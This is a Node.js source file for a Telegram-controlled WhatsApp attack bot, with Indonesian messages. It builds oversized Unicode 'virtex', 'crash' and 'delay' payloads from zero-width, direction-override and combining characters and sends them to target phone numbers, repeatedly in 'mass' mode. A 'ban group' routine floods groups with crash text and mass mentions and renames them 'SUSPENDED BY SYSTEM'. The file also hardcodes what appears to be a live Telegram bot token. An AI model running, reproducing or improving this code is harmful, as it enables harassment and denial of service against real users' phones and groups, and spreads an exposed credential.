const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys')
const P = require('pino')
const TelegramBot = require('node-telegram-bot-api')
const QRCode = require('qrcode')

const TELEGRAM_TOKEN = '9095531664:AAGxlOBp9ZR7RC5NPlVUcPn-SiTNmKTcxP4' //
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true })

let waSock = null;
let adminChatId = null;

async function startWA(chatId) {
    const { state, saveCreds } = await useMultiFileAuthState('session')
    waSock = makeWASocket({ printQRInTerminal: false, auth: state, logger: P({ level: 'silent' }) })
    waSock.ev.on('creds.update', saveCreds)

    waSock.ev.on('connection.update', async (update) => {
        const { connection, qr } = update
        if (qr) {
            const qrImage = await QRCode.toBuffer(qr);
            bot.sendPhoto(chatId, qrImage, { caption: '📲 Scan QR ini pakai WA (Linked Devices)' })
        }
        if (connection === 'open') {
            bot.sendMessage(chatId, '✅ *BOT TERHUBUNG!* Ketik /menu untuk melihat semua senjata.', { parse_mode: 'Markdown' })
        }
    })
}

const generatePayload = {
    virtex: () => "🔥💀😈🤡👻".repeat(400) + "\u202e\u200f\u200e".repeat(150) + "\u0300\u0301\u0302\u0303".repeat(400),
    crash: () => "\u200b".repeat(60000),
    delay: () => "ꦆ".repeat(30000) + "\u035c\u035d\u035e\u035f".repeat(1000),
    blank: () => "\u200e".repeat(20000) + "\u2060".repeat(5000),
    grouptag: () => "@all ".repeat(500) + "\u200b".repeat(10000),
    gcinvisible: () => "\u200b".repeat(40000),
    groupexploit: () => "\u202e".repeat(10000) + "GROUP DESTROYED"
}

async function executeAttack(chatId, target, type, isMass = false) {
    if (!waSock) return bot.sendMessage(chatId, '❌ WA belum login. Ketik /qr dulu.')
    try {
        let jid = target.replace(/\D/g, '') + '@s.whatsapp.net'
        let count = isMass ? 20 : 1
        let payload = generatePayload[type] ? generatePayload[type]() : "Fallback Payload".repeat(1000)
        bot.sendMessage(chatId, `🎯 *TARGET:* ${target}\n💣 *SENJATA:* ${type.toUpperCase()}\n🔢 *AMMO:* ${count}x\n\n⏳ Eksekusi...`, { parse_mode: 'Markdown' })
        for (let i = 1; i <= count; i++) {
            await waSock.sendMessage(jid, { text: payload })
            if (isMass) {
                bot.sendMessage(chatId, `[${i}/${count}] 💥 Terkirim ke ${target}`)
                await new Promise(r => setTimeout(r, 1000))
            }
        }
        bot.sendMessage(chatId, `✅ *SERANGAN SELESAI* ke ${target}`, { parse_mode: 'Markdown' })
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`)
    }
}

async function banGroup(chatId, groupId) {
    if (!waSock) return bot.sendMessage(chatId, '❌ WA belum login. Ketik /qr dulu.')
    if (!groupId.includes('@g.us')) return bot.sendMessage(chatId, '❌ ID tidak valid. Gunakan format 123456@g.us')
    bot.sendMessage(chatId, `🚨 *MEMULAI BAN GROUP*\nGrup: ${groupId}\n\n⏳ Eksekusi...`, { parse_mode: 'Markdown' })
    try {
        let crashPayload = generatePayload.crash();
        await waSock.sendMessage(groupId, { text: crashPayload })
        bot.sendMessage(chatId, `[1/3] 💥 Payload Crash dikirim.`)
        await new Promise(r => setTimeout(r, 1000));
        let tagPayload = generatePayload.grouptag();
        await waSock.sendMessage(groupId, { text: tagPayload })
        bot.sendMessage(chatId, `[2/3] 📢 Spam Mention @all berhasil.`)
        await new Promise(r => setTimeout(r, 1000));
        try {
            await waSock.groupUpdateSubject(groupId, "\u200b".repeat(100) + "SUSPENDED BY SYSTEM")
            bot.sendMessage(chatId, `[3/3] 🔒 Mengubah nama grup.`)
        } catch (e) {
            bot.sendMessage(chatId, `[3/3] ⚠️ Bot tidak punya akses admin ubah nama.`)
        }
        bot.sendMessage(chatId, `✅ *BAN GROUP DIKIRIM!*`, { parse_mode: 'Markdown' })
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal ban grup: ${err.message}`)
    }
}

bot.onText(/\/start/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, '🤖 *BOT DARK SYSTEM READY*\n\n/start - Start\n/qr - Login WA\n/menu - List Senjata', { parse_mode: 'Markdown' })
})

bot.onText(/\/menu/, (msg) => {
    const menu = `
💀 *MEGA PACKAGE MENU* 💀
*[PRIBADI]* /virtex 62xxx, /crash 62xxx, /delay 62xxx
*[MASSAL]* /virtexmass 62xxx, /crashmass 62xxx
*[GROUP]* /bangroup 123xxx@g.us, /grouptag 123xxx@g.us
    `;
    bot.sendMessage(adminChatId, menu, { parse_mode: 'Markdown' })
})

bot.onText(/\/qr/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, '⏳ Menyiapkan QR Code...')
    startWA(adminChatId)
})

bot.on('message', (msg) => {
    const text = msg.text;
    if (!text || !text.startsWith('/')) return;
    
    const args = text.split(' ');
    const command = args[0].replace('/', '').toLowerCase();
    const target = args[1];
    const senderId = msg.chat.id;

    if (['start', 'menu', 'qr'].includes(command)) return;
    if (!target) return bot.sendMessage(senderId, '❌ Format salah. Contoh: /virtex 628123456789');

    if (command === 'bangroup') {
        return banGroup(senderId, target);
    }

    let isMass = command.includes('mass');
    let type = command.replace('mass', '');
    
    if (generatePayload[type] || isMass) {
        executeAttack(senderId, target, type, isMass);
    } else {
        bot.sendMessage(senderId, '❌ Senjata tidak ditemukan. Ketik /menu.');
    }
});

console.log('Bot Ultimate Package & Ban Group Menyala...')
